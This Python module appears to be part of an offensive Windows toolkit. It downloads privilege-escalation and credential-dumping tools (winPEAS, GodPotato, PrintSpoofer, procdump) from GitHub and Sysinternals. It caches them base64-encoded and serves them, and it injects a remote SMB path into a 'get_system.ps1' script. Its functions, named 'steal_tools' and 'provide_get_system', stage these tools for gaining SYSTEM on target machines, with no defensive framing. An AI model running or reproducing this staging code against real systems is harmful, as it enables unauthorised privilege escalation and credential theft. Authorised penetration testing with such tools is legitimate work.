import base64
import os
import pathlib

import requests

"""This will download the tools needed from github - THIS TRUSTS FOREIGN SOURCES!!"""

winpeas_link = "https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1"
godpotato_link = "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
printspoofer_link = "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
procdump_link = "https://live.sysinternals.com/procdump64.exe"

tools_to_steal = {"winpeas": winpeas_link, "godpotato": godpotato_link, "printspoofer": printspoofer_link, "procdump": procdump_link}

usetmp = True

def filename(tool_name):
    return f"/tmp/{tool_name}.based" if usetmp else f"{tool_name}.based"

def steal_tools():
    for name, link in tools_to_steal.items():
        file_name = filename(name)
        if os.path.exists(file_name):
            continue
        print(f"Downloading {file_name}")
        tool_response = requests.get(link, allow_redirects=True).content
        with open(file_name, "wb") as f:
            f.write(base64.b64encode(tool_response))

def provide_tool(name):
    file_name = filename(name)
    if not os.path.exists(file_name):
        steal_tools()
    with open(file_name, "rb") as f:
        return base64.b64decode(f.read())

def provide_godpotato():
    return provide_tool("godpotato")

def provide_printspoofer():
    return provide_tool("printspoofer")

def provide_get_system(smb_remote_file_path):
    """DO NOT PASS THE OBJECT PASS THE REMOTE FILE PATH!"""
    get_system_path = os.path.join(pathlib.Path(__file__).parent, "get_system.ps1")
    with open(get_system_path) as f:
        return f.read().replace("{{REMOTE_FILE_GOES_HERE}}", smb_remote_file_path)
